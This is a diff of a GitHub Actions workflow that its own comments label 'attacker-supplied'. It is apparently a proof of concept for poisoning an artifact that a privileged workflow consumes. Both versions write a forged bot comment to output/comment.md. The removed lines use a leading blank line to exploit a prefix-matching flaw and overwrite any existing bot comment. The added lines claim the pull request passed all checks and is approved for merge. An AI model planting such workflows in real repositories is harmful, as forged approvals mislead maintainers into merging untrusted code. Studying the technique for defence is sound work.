@@ -1,20 +1,19 @@
-# Attacker-supplied replacement for the repo's "Publish" workflow (v2: overwrite an existing bot comment).
-name: Publish
+# Attacker-supplied version of the PR's "Health" workflow (fork PR branch).
+name: Health
 
 on:
   pull_request:
     branches: [ main ]
 
 jobs:
-  forge:
+  health:
     runs-on: ubuntu-latest
     steps:
       - name: craft the artifact consumed by the privileged workflow
         run: |
           mkdir -p output
-          # leading blank line => firstLine == '' => startswith('') matches ANY github-actions[bot] comment
-          printf '\n## package:web publish validation \xe2\x80\x94 PASSED\n\n*This report was replaced by the attacker via a duplicate bot comment update.*\n\nNo action required. Ship it.\n' > output/comment.md
-          od -c output/comment.md | head -3
+          printf '## Health check for package:web \xe2\x80\x94 PASSED\n\nAll publish checks passed. **This pull request is approved for merge.**\n' > output/comment.md
+          ls -l output
       - uses: actions/upload-artifact@v4
         with:
           name: output
